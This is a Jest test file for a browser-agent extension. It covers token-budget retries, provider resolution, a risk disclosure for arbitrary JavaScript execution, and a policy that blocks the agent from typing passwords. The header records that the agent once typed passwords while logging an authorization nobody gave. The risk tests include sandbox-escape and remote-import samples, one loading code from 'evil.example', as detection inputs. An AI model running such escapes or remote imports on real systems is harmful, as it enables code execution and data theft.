// tests/upgrade-audit.test.js
//
// Covers the four upgrades from this pass:
//   1. llm-thinking-budget  — a reasoning model that burns its budget on
//      reasoning_content and returns finish_reason "length" with empty content.
//      Observed live: 25.5s and a full billed call for nothing, after which
//      generatePlan() quietly degraded to a single-step plan.
//   2. resolveProviderForConfig — callLLM resolved the provider from the
//      ENDPOINT only, so every self-hosted provider was driven with OpenAI's
//      builders and parsers; their own definitions had never run.
//   3. execute-js-risk — honest disclosure on the approval card, since the
//      sandbox is a guard-rail against model mistakes and not a boundary.
//   4. credential-policy — the agent used to type into input[type=password]
//      unconditionally, logging "proceeding per IT-tech authorization" when
//      nobody had authorized anything.

import { jest } from '@jest/globals';

// ═══════════════════════════════════════════════════════════════════════════
describe('thinking-model token budget', () => {
  let mod;
  beforeAll(async () => { mod = await import('../background/llm-thinking-budget.js'); });

  const truncatedEmpty = {
    choices: [{ finish_reason: 'length', message: { content: '', reasoning_content: 'thinking…' } }],
  };
  const truncatedWithContent = {
    choices: [{ finish_reason: 'length', message: { content: '{"plan":["step one"]}' } }],
  };
  const completeEmpty = {
    choices: [{ finish_reason: 'stop', message: { content: '' } }],
  };

  test('detects truncation with no usable content — the live failure', () => {
    expect(mod.isTruncatedThinking(truncatedEmpty)).toBe(true);
  });

  test('a think-block-only response counts as empty', () => {
    expect(mod.isTruncatedThinking({
      choices: [{ finish_reason: 'length', message: { content: '<think>reasoning</think>   ' } }],
    })).toBe(true);
  });

  test('does NOT fire when a truncated response still carried content', () => {
    // Re-billing every verbose-but-usable reply would double the cost of the
    // common case, which is the opposite of the point.
    expect(mod.isTruncatedThinking(truncatedWithContent)).toBe(false);
  });

  test('does NOT fire on a normal completion', () => {
    expect(mod.isTruncatedThinking(completeEmpty)).toBe(false);
    expect(mod.isTruncatedThinking({ choices: [{ finish_reason: 'stop', message: { content: 'ok' } }] })).toBe(false);
  });

  test('understands the Anthropic shape', () => {
    expect(mod.isTruncatedThinking({ stop_reason: 'max_tokens', content: [] })).toBe(true);
    expect(mod.isTruncatedThinking({ stop_reason: 'max_tokens', content: [{ type: 'text', text: 'answer' }] })).toBe(false);
    expect(mod.isTruncatedThinking({ stop_reason: 'end_turn', content: [] })).toBe(false);
  });

  test('survives garbage input', () => {
    for (const bad of [null, undefined, 42, 'x', {}, { choices: [] }, { choices: [{}] }]) {
      expect(() => mod.isTruncatedThinking(bad)).not.toThrow();
      expect(mod.isTruncatedThinking(bad)).toBe(false);
    }
  });

  test('the retry budget grows and is capped', () => {
    expect(mod.nextTokenBudget(1200)).toBe(4800);
    expect(mod.nextTokenBudget(8000)).toBe(16000);
    expect(mod.nextTokenBudget(999999)).toBe(mod.THINKING_MAX_TOKENS_CAP);
    expect(mod.nextTokenBudget(0)).toBe(4800);
    expect(mod.nextTokenBudget(NaN)).toBe(4800);
  });

  test('retries exactly once, never in a loop', () => {
    const first = mod.planThinkingRetry(truncatedEmpty, 0, 1200);
    expect(first.retry).toBe(true);
    expect(first.budget).toBe(4800);

    const second = mod.planThinkingRetry(truncatedEmpty, 1, 4800);
    expect(second.retry).toBe(false);
    expect(second.reason).toMatch(/already retried/);
  });

  test('does not retry when already at the cap', () => {
    const v = mod.planThinkingRetry(truncatedEmpty, 0, mod.THINKING_MAX_TOKENS_CAP);
    expect(v.retry).toBe(false);
    expect(v.reason).toMatch(/cap/);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
describe('resolveProviderForConfig', () => {
  let reg;
  beforeAll(async () => {
    globalThis.chrome = globalThis.chrome || { storage: { local: { get: async () => ({}) } } };
    reg = await import('../background/provider-registry.js');
  });

  test('a non-OpenAI wire format is dictated by the endpoint, not the dropdown', () => {
    // The server decides the request shape. Selecting "openai" against an
    // Anthropic endpoint must still speak Anthropic.
    expect(reg.resolveProviderForConfig({ id: 'openai', endpoint: 'https://api.anthropic.com/v1/messages' }))
      .toBe(reg.PROVIDERS.anthropic);
    expect(reg.resolveProviderForConfig({ id: 'openai', endpoint: 'https://api.z.ai/api/paas/v4/chat/completions' }))
      .toBe(reg.PROVIDERS.zai);
  });

  test('the operator\'s chosen provider wins for OpenAI-compatible endpoints', () => {
    // The trap: this used to return PROVIDERS.openai for every local provider,
    // so ollama's own lenient parseResponse and optional-auth buildHeaders
    // never ran once.
    const p = reg.resolveProviderForConfig({ id: 'ollama', endpoint: 'http://localhost:11434/v1/chat/completions' });
    expect(p).toBeTruthy();
    expect(p.parseResponse).toBe(reg.PROVIDERS.ollama.parseResponse);
    expect(p.parseResponse).not.toBe(reg.PROVIDERS.openai.parseResponse);
  });

  test('a local provider keeps optional-auth headers (no empty Bearer)', () => {
    const p = reg.resolveProviderForConfig({ id: 'ollama', endpoint: 'http://localhost:11434/v1/chat/completions' });
    expect(p.buildHeaders('').Authorization).toBeUndefined();
    expect(p.buildHeaders('k').Authorization).toBe('Bearer k');
  });

  test('a local provider inherits the OpenAI body builder it needs', () => {
    const p = reg.resolveProviderForConfig({ id: 'ollama', endpoint: 'http://localhost:11434/v1/chat/completions' });
    expect(typeof p.buildBody).toBe('function');
    const body = p.buildBody('llama3.2', 'sys', 'user', { maxTokens: 100 });
    expect(body.model).toBe('llama3.2');
    expect(Array.isArray(body.messages)).toBe(true);
  });

  test('an id we have no definition for falls back to endpoint sniffing', () => {
    const p = reg.resolveProviderForConfig({ id: 'some-unknown-vendor', endpoint: 'https://example.com/v1/chat' });
    expect(p).toBe(reg.PROVIDERS.openai);
  });

  test('a missing config does not throw', () => {
    expect(() => reg.resolveProviderForConfig(null)).not.toThrow();
    expect(() => reg.resolveProviderForConfig({})).not.toThrow();
    expect(reg.resolveProviderForConfig({})).toBe(reg.PROVIDERS.openai);
  });

  test('the resolved provider always has an id, for the stream-accumulator switch', () => {
    for (const id of ['ollama', 'lmstudio', 'vllm']) {
      expect(reg.resolveProviderForConfig({ id, endpoint: 'http://localhost:1/v1' }).id).toBeTruthy();
    }
  });
});

// ═══════════════════════════════════════════════════════════════════════════
describe('execute_js approval disclosure', () => {
  let risk;
  beforeAll(async () => { risk = await import('../background/execute-js-risk.js'); });

  test('flags the canonical reflective escape', () => {
    const r = risk.assessExecuteJsRisk('return ({}).constructor.constructor("return this")();');
    expect(r.escapesSandbox).toBe(true);
    expect(r.risks.some(x => x.id === 'reflective-function')).toBe(true);
  });

  test.each([
    ['eval', 'eval("1+1")'],
    ['function-ctor', 'new Function("return 1")()'],
    ['dynamic-import', 'await import("https://evil.example/x.js")'],
    ['global-reach', 'globalThis["fetch"]("/x")'],
    ['proto-walk', 'Object.getPrototypeOf(x)'],
  ])('flags %s as a sandbox escape', (id, code) => {
    const r = risk.assessExecuteJsRisk(code);
    expect(r.risks.some(x => x.id === id)).toBe(true);
    expect(r.escapesSandbox).toBe(true);
  });

  test('flags exfiltration and obfuscation without calling them escapes', () => {
    const r = risk.assessExecuteJsRisk('fetch("/x"); atob("aGk=");');
    expect(r.risks.some(x => x.id === 'network')).toBe(true);
    expect(r.risks.some(x => x.id === 'obfuscation')).toBe(true);
    expect(r.escapesSandbox).toBe(false);
  });

  test('ordinary DOM extraction is not flagged', () => {
    const r = risk.assessExecuteJsRisk(
      'return [...document.querySelectorAll(".ticket")].map(e => e.textContent.trim());'
    );
    expect(r.risks).toEqual([]);
    expect(r.escapesSandbox).toBe(false);
  });

  test('the disclosure states that approving SKIPS the sandbox', () => {
    const d = risk.buildExecuteJsDisclosure('return 1;');
    expect(d.detail).toMatch(/sandbox is SKIPPED/i);
    expect(d.detail).toMatch(/NOT a security boundary/i);
    expect(d.detail).toMatch(/constructor\.constructor/);
  });

  test('the headline escalates for code that can escape', () => {
    expect(risk.buildExecuteJsDisclosure('return 1;').headline).not.toMatch(/⚠️/);
    expect(risk.buildExecuteJsDisclosure('eval("x")').headline).toMatch(/⚠️/);
  });

  test('handles non-string input', () => {
    for (const bad of [null, undefined, 42, {}]) {
      expect(() => risk.buildExecuteJsDisclosure(bad)).not.toThrow();
    }
  });
});

// ═══════════════════════════════════════════════════════════════════════════
describe('credential typing policy', () => {
  let cp;
  beforeAll(async () => {
    globalThis.window = globalThis.window || globalThis;
    globalThis.window.__sentinelUtils = {};
    await import('../content/credential-policy.js');
    cp = globalThis.window.__sentinelUtils.credPolicy;
  });

  const decide = (o) => cp.decideCredentialTyping(o);

  test('a non-sensitive field proceeds with no audit noise', () => {
    const v = decide({ sensitiveMatch: null, isPasswordInput: false, policy: 'block' });
    expect(v.decision).toBe('proceed');
    expect(v.sensitive).toBe(false);
    expect(v.audit).toBe(false);
  });

  test('DEFAULT blocks typing into a password input', () => {
    // The shipped behaviour was to type regardless and log
    // "proceeding per IT-tech authorization" — with no setting and no prompt.
    const v = decide({ isPasswordInput: true, policy: undefined });
    expect(v.decision).toBe('blocked');
    expect(v.audit).toBe(true);
  });

  test('blocks a detector-matched secret field even when not type=password', () => {
    const v = decide({ sensitiveMatch: 'client secret', isPasswordInput: false, policy: 'block' });
    expect(v.decision).toBe('blocked');
  });

  test('an unknown or malformed policy value fails SAFE to block', () => {
    for (const bad of ['allowed', 'ALLOW', '', 'yes', 0, null, {}]) {
      expect(decide({ isPasswordInput: true, policy: bad }).decision).toBe('blocked');
    }
  });

  test('policy=approve asks rather than deciding on its own', () => {
    expect(decide({ isPasswordInput: true, policy: 'approve' }).decision).toBe('needs_approval');
  });

  test('an approval granted for this request is consent, and proceeds', () => {
    const v = decide({ isPasswordInput: true, policy: 'approve', approved: true });
    expect(v.decision).toBe('proceed');
    expect(v.audit).toBe(true);
  });

  test('policy=allow proceeds but is still audited', () => {
    const v = decide({ isPasswordInput: true, policy: 'allow' });
    expect(v.decision).toBe('proceed');
    expect(v.audit).toBe(true);
    expect(v.reason).toMatch(/logged/);
  });

  test('every sensitive outcome is audited, whatever the decision', () => {
    for (const policy of ['block', 'approve', 'allow']) {
      expect(decide({ isPasswordInput: true, policy }).audit).toBe(true);
    }
  });

  test('the blocked message tells the MODEL to hand off, not to retry', () => {
    const m = cp.blockedMessage('password input');
    expect(m).toMatch(/HUMAN HANDOFF REQUIRED/);
    expect(m).toMatch(/Do not retry/i);
    expect(m).toMatch(/another selector/i);
    expect(m).toMatch(/Settings/);
  });

  test('missing input does not throw', () => {
    expect(() => decide(undefined)).not.toThrow();
    expect(decide(undefined).decision).toBe('proceed');
  });
});

// ═══════════════════════════════════════════════════════════════════════════
describe('wiring', () => {
  test('credential-policy.js is injected before index.js and index fails closed', async () => {
    const { readFileSync } = await import('fs');
    const tm = readFileSync(new URL('../background/tab-manager.js', import.meta.url), 'utf8');
    const files = tm.slice(tm.indexOf('CONTENT_SCRIPT_FILES'));
    expect(files.indexOf("'content/credential-policy.js'"))
      .toBeLessThan(files.indexOf("'content/index.js'"));

    const idx = readFileSync(new URL('../content/index.js', import.meta.url), 'utf8');
    expect(idx).toContain('policy module unavailable');
    // The old unconditional-typing comment must be gone.
    expect(idx).not.toContain('proceeding per IT-tech authorization');
  });

  test('npm test no longer hides open handles behind --forceExit', async () => {
    const { readFileSync } = await import('fs');
    const pkg = JSON.parse(readFileSync(new URL('../package.json', import.meta.url), 'utf8'));
    expect(pkg.scripts.test).not.toMatch(/--forceExit/);
    expect(pkg.scripts['test:quick']).not.toMatch(/--forceExit/);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// Regression: the live keyless-provider test caught this, no unit test did.
// Returning a PARTIAL local provider definition bare dropped everything it does
// not define — including systemPromptTweak — so buildBody emitted
// {"role":"system"} with no content field and ollama rejected the request with
// "invalid message content type: <nil>".
describe('partial local provider definitions are layered over OpenAI', () => {
  let reg;
  beforeAll(async () => {
    globalThis.chrome = globalThis.chrome || { storage: { local: { get: async () => ({}) } } };
    reg = await import('../background/provider-registry.js');
  });

  test.each(['ollama', 'lmstudio', 'vllm'])('%s produces a well-formed body', (id) => {
    const p = reg.resolveProviderForConfig({ id, endpoint: 'http://localhost:1234/v1/chat/completions' });
    const body = p.buildBody('m', p.systemPromptTweak, 'hello', { maxTokens: 50 });
    for (const msg of body.messages) {
      expect(typeof msg.content).toBe('string');
      expect(Object.prototype.hasOwnProperty.call(msg, 'content')).toBe(true);
    }
    // Serialising must not silently drop a content key.
    expect(JSON.stringify(body)).not.toMatch(/\{"role":"system"\}/);
  });

  test.each(['ollama', 'lmstudio', 'vllm'])('%s keeps its OWN parseResponse and headers', (id) => {
    const p = reg.resolveProviderForConfig({ id, endpoint: 'http://localhost:1234/v1/chat/completions' });
    expect(p.parseResponse).toBe(reg.PROVIDERS[id].parseResponse);
    expect(p.buildHeaders('').Authorization).toBeUndefined();
  });

  test('self-contained providers are never layered', () => {
    expect(reg.resolveProviderForConfig({ id: 'anthropic', endpoint: 'http://proxy/v1' })).toBe(reg.PROVIDERS.anthropic);
    expect(reg.resolveProviderForConfig({ id: 'openai', endpoint: 'http://proxy/v1' })).toBe(reg.PROVIDERS.openai);
  });

  test('buildBody omits the system message entirely when there is no prompt', () => {
    const body = reg.PROVIDERS.openai.buildBody('m', undefined, 'hi', {});
    expect(body.messages).toHaveLength(1);
    expect(body.messages[0].role).toBe('user');
  });
});
